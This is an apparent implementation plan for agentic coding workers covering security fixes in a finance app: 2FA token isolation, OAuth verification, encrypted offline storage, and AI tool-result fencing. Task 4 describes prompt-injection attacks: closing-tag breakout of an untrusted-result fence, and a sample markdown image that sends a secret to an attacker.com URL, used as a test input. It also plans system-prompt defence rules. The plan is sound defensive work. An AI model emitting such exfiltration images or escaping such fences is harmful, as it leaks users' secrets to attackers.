# Wave 2 Defense-in-Depth Security Remediation Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Implement the Wave 2 Defense-in-Depth Security specification covering 2FA temporary token privilege isolation, 2FA disable credential re-auth, OAuth server-side verification, frontend Web Crypto (AES-GCM) offline database encryption & server URL whitelist, and AI tool context poisoning protection.

**Architecture:** 
- In backend Auth and JWT middlewares, issue restricted `type: "2fa_pending"` tokens for 2FA login with 5-minute expiry, blocked from all normal APIs by `jwt_middleware`, and require password/code verification on 2FA disable.
- For OAuth, reject client-asserted `oauth_id`, requiring authoritative server-side exchange or controlled test mock mode.
- In frontend, encrypt local SQLite offline storage with Web Crypto AES-256-GCM (key stored in IndexedDB) with backwards-compatible migration, and enforce strict origin and HTTPS rules on `server-url.ts`.
- In AI runtime, fence external tool outputs in `<untrusted_tool_result>` tags with closing tag sanitization, strip markdown exfiltration images, and inject anti-prompt-injection system prompt guardrails.

**Tech Stack:** C23, csilk HTTP & JWT framework, SQLite, TypeScript / Vue 3, Web Crypto API (`window.crypto.subtle`), Vitest, CMake, CTest, Bash.

**Spec:** `docs/superpowers/specs/2026-11-06-wave2-defense-in-depth-security-design.md`

## Global Constraints

- Backend responses follow HTTP 200 `{code, message, data}` envelope convention, except JWT unauthorized middleware which responds with HTTP 401.
- All SQL queries use `?` placeholders with `csilk_db_query_param_json` or `csilk_db_exec`.
- Frontend code must pass `vue-tsc -b && vite build` and `npm test` with 0 errors.
- Never break existing 51 CTest unit test suites or 184 assertions in `test_link.sh`.

## Review Focus

1. **`temp_token` privilege escalation**: Ensure a 2FA temporary token cannot access `/api/accounts`, `/api/transactions`, or any other authenticated endpoint under any circumstances.
2. **2FA disable bypass**: Ensure calling `/api/auth/2fa/disable` without credentials returns HTTP 1002/1004 and does not disable TOTP.
3. **OAuth account spoofing**: Ensure client cannot provide arbitrary `oauth_id` to log in as another user.
4. **Offline database encryption backward compatibility**: Ensure existing plaintext `b64:` and `[...]` databases in `localStorage` load successfully without data loss and upgrade to `enc:v1:` on next save.
5. **AI Prompt Injection tag breakout**: Ensure attacker-controlled HTML containing `</untrusted_tool_result>` cannot escape the XML fence in AI context messages.

---

### Task 1: 2FA Authentication Lifecycle Hardening (`temp_token` & Disable Re-auth)

**Files:**
- Modify: `backend/src/common/jwt.h`
- Modify: `backend/src/common/jwt.c`
- Modify: `backend/src/middlewares/jwt_middleware.c:120-220`
- Modify: `backend/src/application/auth/commands.h`
- Modify: `backend/src/application/auth/usecases.c:195-230,490-565`
- Modify: `backend/src/interfaces/http/controllers/auth_controller.c:200-240`
- Create: `backend/tests/unit/test_auth_2fa_lifecycle.c`
- Modify: `backend/CMakeLists.txt`

**Interfaces:**
- Produces: `char* jwt_generate_temp_token(csilk_ctx_t* c, int64_t user_id, int token_version, int expire_sec)`
- Produces: `jwt_middleware_wrapper` rejecting `"type": "2fa_pending"` tokens for all routes except `/api/auth/2fa/verify-login`
- Produces: `disable_2fa_cmd_t` with `const char* password` and `const char* code`

- [ ] **Step 1: Write the failing test for 2FA temp_token restriction and disable re-auth**

Create `backend/tests/unit/test_auth_2fa_lifecycle.c` asserting:
1. `jwt_generate_temp_token()` outputs a valid JWT with claim `"type": "2fa_pending"` and short expiry.
2. `jwt_middleware_wrapper()` intercepts `2fa_pending` token on normal paths (`/api/accounts`) and aborts with 401.
3. `auth_usecase_2fa_disable()` fails with error 1002 when called without password or code, and succeeds only when valid password or TOTP code is provided.

- [ ] **Step 2: Run test to verify it fails**

Run: `cmake --build backend/build --target test_auth_2fa_lifecycle && ./backend/build/tests/unit/test_auth_2fa_lifecycle`
Expected: Compilation failure or assertion failure due to missing `jwt_generate_temp_token` and unupdated `auth_usecase_2fa_disable`.

- [ ] **Step 3: Implement `jwt_generate_temp_token` and middleware check**

1. In `backend/src/common/jwt.h` and `backend/src/common/jwt.c`:
   Implement `jwt_generate_temp_token(csilk_ctx_t* c, int64_t user_id, int token_version, int expire_sec)` which creates payload with `"type": "2fa_pending"`, `"sub": user_id`, `"v": token_version`, `"exp": now + expire_sec`.
2. In `backend/src/middlewares/jwt_middleware.c`:
   After token verification, check:
   ```c
   const char* token_type = csilk_json_get_string(payload, "type");
   if (token_type && strcmp(token_type, "2fa_pending") == 0) {
       if (!path || strcmp(path, "/api/auth/2fa/verify-login") != 0) {
           csilk_json_free(payload);
           csilk_json_error(c, CSILK_STATUS_UNAUTHORIZED, "2FA verification required: temporary token cannot access protected endpoints");
           csilk_abort(c);
           return;
       }
   }
   ```
3. In `backend/src/application/auth/usecases.c`:
   - In `auth_usecase_login`: use `jwt_generate_temp_token(c, user.id, user.token_version, 300)` when `is_2fa_active` is true.
   - In `auth_usecase_2fa_verify_login`: ensure `csilk_json_get_string(payload, "type")` is `"2fa_pending"`.
   - In `auth_usecase_2fa_disable`: accept `const disable_2fa_cmd_t* cmd`, verify `cmd->password` via `csilk_auth_verify_password` or `cmd->code` via `csilk_totp_verify_code`. If neither succeeds, return 1002.
4. In `backend/src/interfaces/http/controllers/auth_controller.c`:
   In `api_auth_2fa_disable`, bind JSON body to populate `password` and `code`.

- [ ] **Step 4: Run test to verify it passes**

Run: `cmake --build backend/build --target test_auth_2fa_lifecycle && ./backend/build/tests/unit/test_auth_2fa_lifecycle`
Expected: PASS with 0 errors.

- [ ] **Step 5: Commit**

```bash
git add backend/src/common/jwt.h backend/src/common/jwt.c backend/src/middlewares/jwt_middleware.c backend/src/application/auth/ backend/src/interfaces/http/controllers/auth_controller.c backend/tests/unit/test_auth_2fa_lifecycle.c backend/CMakeLists.txt
git commit -m "fix(auth): enforce 2fa pending token restriction and disable re-authentication"
```

---

### Task 2: OAuth Provider Verification & Client Spoofing Protection

**Files:**
- Modify: `backend/src/application/auth/commands.h`
- Modify: `backend/src/application/auth/usecases.h`
- Modify: `backend/src/application/auth/usecases.c:640-730`
- Modify: `backend/src/interfaces/http/controllers/auth_controller.c:250-280`
- Create: `backend/tests/unit/test_oauth_security.c`
- Modify: `backend/CMakeLists.txt`

**Interfaces:**
- Produces: `auth_usecase_oauth_callback` rejecting client-supplied `oauth_id`
- Produces: Server-side GitHub / OIDC token exchange via curl, or test mock when `MINEFOLIO_TEST_OAUTH_MOCK=1`

- [ ] **Step 1: Write the failing test for OAuth security**

Create `backend/tests/unit/test_oauth_security.c` asserting:
1. Submitting arbitrary `oauth_id` in request is strictly ignored or rejected.
2. Missing OAuth provider configuration returns error code 1002.
3. In test mock mode (`MINEFOLIO_TEST_OAUTH_MOCK=1`), valid mock code exchanges successfully, while invalid code fails.

- [ ] **Step 2: Run test to verify it fails**

Run: `cmake --build backend/build --target test_oauth_security && ./backend/build/tests/unit/test_oauth_security`
Expected: FAIL due to existing code trusting client-supplied `oauth_id`.

- [ ] **Step 3: Implement server-side verification and test mock**

1. In `commands.h`:
   Remove or deprecate `oauth_id` from `oauth_callback_cmd_t`.
2. In `auth_controller.c`:
   Do not bind `oauth_id` from client JSON request.
3. In `auth_usecase_oauth_callback`:
   - If `getenv("MINEFOLIO_TEST_OAUTH_MOCK")` is `"1"`:
     If `cmd->code` starts with `"mock_code_"`, derive `oauth_id` as `sub_${code}` and allow login/register; otherwise return 1002.
   - If not in mock mode:
     - Check `config_secret_get("OAUTH_GITHUB_CLIENT_ID")` and `OAUTH_GITHUB_CLIENT_SECRET`.
     - Perform curl POST to GitHub access token endpoint and GET to `/user`.
     - Extract authoritative user ID and login name.
     - Reject if exchange fails.

- [ ] **Step 4: Run test to verify it passes**

Run: `cmake --build backend/build --target test_oauth_security && ./backend/build/tests/unit/test_oauth_security`
Expected: PASS with 0 errors.

- [ ] **Step 5: Commit**

```bash
git add backend/src/application/auth/ backend/src/interfaces/http/controllers/auth_controller.c backend/tests/unit/test_oauth_security.c backend/CMakeLists.txt
git commit -m "fix(auth): secure oauth callback with server-side provider verification"
```

---

### Task 3: Frontend Web Crypto (AES-GCM) Storage & Server URL Guard

**Files:**
- Create: `frontend/src/utils/crypto-storage.ts`
- Modify: `frontend/src/db/local.ts:1-135`
- Modify: `frontend/src/utils/server-url.ts:1-120`
- Create: `frontend/src/__tests__/crypto-storage.spec.ts`
- Create: `frontend/src/__tests__/server-url.spec.ts`

**Interfaces:**
- Produces: `encryptPayload(data: Uint8Array): Promise<string>`
- Produces: `decryptPayload(saved: string): Promise<Uint8Array>`
- Produces: `isValidServerUrl(url: string): boolean` with protocol & LAN/HTTPS validation

- [ ] **Step 1: Write the failing tests for frontend crypto storage and server url**

1. Create `frontend/src/__tests__/crypto-storage.spec.ts`:
   - Verify `encryptPayload` produces `enc:v1:...`.
   - Verify `decryptPayload` decrypts back to original bytes.
   - Verify `decryptPayload` seamlessly handles legacy `b64:` and `[...]` strings.
2. Create `frontend/src/__tests__/server-url.spec.ts`:
   - Verify `javascript:`, `file:`, `data:` are rejected.
   - Verify `http://localhost:8080`, `http://127.0.0.1:8080`, `http://192.168.1.100` are accepted.
   - Verify `http://api.minefolio.com` (public HTTP) is rejected, while `https://api.minefolio.com` is accepted.

- [ ] **Step 2: Run tests to verify they fail**

Run: `npm --prefix frontend test`
Expected: FAIL due to missing `crypto-storage.ts` and unhardened `server-url.ts`.

- [ ] **Step 3: Implement `crypto-storage.ts`, update `local.ts` and `server-url.ts`**

1. Create `frontend/src/utils/crypto-storage.ts`:
   - Use `window.crypto.subtle` for AES-GCM (256-bit key, 12-byte IV).
   - Manage encryption key in IndexedDB (or fallback memory key if IndexedDB / WebCrypto is mocked or missing in test runners).
   - Export `encryptPayload` and `decryptPayload`.
2. In `frontend/src/db/local.ts`:
   - In `initLocalDb()`: call `decryptPayload(saved)` to parse bytes.
   - In `persist()`: call `encryptPayload(data)` asynchronously or synchronously fallback to save encrypted state to `localStorage`.
3. In `frontend/src/utils/server-url.ts`:
   - Implement strict protocol and host validation in `isValidServerUrl()` and `normalizeServerUrl()`.

- [ ] **Step 4: Run tests to verify they pass**

Run: `npm --prefix frontend test && npm --prefix frontend run build`
Expected: All Vitest tests PASS and `vue-tsc -b && vite build` succeeds with 0 errors.

- [ ] **Step 5: Commit**

```bash
git add frontend/src/utils/crypto-storage.ts frontend/src/db/local.ts frontend/src/utils/server-url.ts frontend/src/__tests__/
git commit -m "feat(frontend): implement web crypto local db encryption and server url security guard"
```

---

### Task 4: AI External Context Poisoning Protection & Delimited Sandbox Fencing

**Files:**
- Modify: `backend/src/services/ai/runtime/loop.c:270-305,860-900`
- Modify: `backend/src/services/ai/tools/web_search_tool.c:980-1010`
- Modify: `backend/src/services/ai/runtime/prompt.c:1-120`
- Create: `backend/tests/unit/test_ai_prompt_injection_defense.c`
- Modify: `backend/CMakeLists.txt`

**Interfaces:**
- Produces: `<untrusted_tool_result tool="...">` XML wrapper with `&lt;/untrusted_tool_result&gt;` escaping
- Produces: Markdown exfiltration image stripping in `web_search_tool.c`
- Produces: System prompt guardrails in `prompt.c`

- [ ] **Step 1: Write the failing test for AI prompt injection defense**

Create `backend/tests/unit/test_ai_prompt_injection_defense.c` asserting:
1. External tool outputs (`web_search` and `mcp_*`) are enclosed in `<untrusted_tool_result>`.
2. Content containing adversarial `</untrusted_tool_result>` has the closing tag properly sanitized.
3. Content containing `![leak](https://attacker.com/leak?k=secret)` has the markdown image stripped or disarmed.
4. System prompt contains explicit prompt injection defense rules.

- [ ] **Step 2: Run test to verify it fails**

Run: `cmake --build backend/build --target test_ai_prompt_injection_defense && ./backend/build/tests/unit/test_ai_prompt_injection_defense`
Expected: FAIL due to missing XML fence isolation and unstripped markdown images.

- [ ] **Step 3: Implement tool result fencing, markdown image sanitization, and system prompt rules**

1. In `backend/src/services/ai/runtime/loop.c`:
   Implement `loop_wrap_tool_result_isolated(const char* tool_name, const char* result)`.
   If `tool_name` is `"web_search"` or starts with `"mcp_"`, escape closing tags and enclose with `<untrusted_tool_result tool="...">\n%s\n</untrusted_tool_result>`.
2. In `backend/src/services/ai/tools/web_search_tool.c`:
   Filter `!\[.*?\]\(https?://.*?\)` patterns from scraped web content.
3. In `backend/src/services/ai/runtime/prompt.c`:
   Add system prompt security rules regarding `<untrusted_tool_result>`.

- [ ] **Step 4: Run test to verify it passes**

Run: `cmake --build backend/build --target test_ai_prompt_injection_defense && ./backend/build/tests/unit/test_ai_prompt_injection_defense`
Expected: PASS with 0 errors.

- [ ] **Step 5: Commit**

```bash
git add backend/src/services/ai/runtime/loop.c backend/src/services/ai/tools/web_search_tool.c backend/src/services/ai/runtime/prompt.c backend/tests/unit/test_ai_prompt_injection_defense.c backend/CMakeLists.txt
git commit -m "feat(ai): add untrusted tool result fencing and prompt injection guardrails"
```

---

### Task 5: End-to-End Integration Verification & Full Test Suite

**Files:**
- Modify: `backend/tests/test_link.sh`

**Interfaces:**
- Produces: Integrated test cases validating 2FA `temp_token` 401 denial, 2FA disable password requirement, and OAuth spoofing rejection.

- [ ] **Step 1: Add integration assertions to `test_link.sh`**

Add assertions in `backend/tests/test_link.sh`:
- Case: Generate 2FA login response, extract `temp_token`, make GET request to `/api/accounts` with `Authorization: Bearer <temp_token>`, assert response is HTTP 401.
- Case: Call `/api/auth/2fa/disable` without credentials, assert response returns code `1002`.
- Case: Call `/api/auth/oauth/callback` with injected `oauth_id`, assert response code is `1002` (rejected).

- [ ] **Step 2: Run full backend and frontend test suites**

Run:
```bash
cmake --build backend/build --parallel
ctest --test-dir backend/build --output-on-failure
./backend/tests/test_link.sh
npm --prefix frontend test
npm --prefix frontend run build
```
Expected: All CTest test suites PASS, `test_link.sh` passes 185+ assertions with 0 errors, Vitest passes, and frontend build succeeds with 0 errors.

- [ ] **Step 3: Commit**

```bash
git add backend/tests/test_link.sh
git commit -m "test(integration): pin wave 2 security invariants in test_link.sh"
```
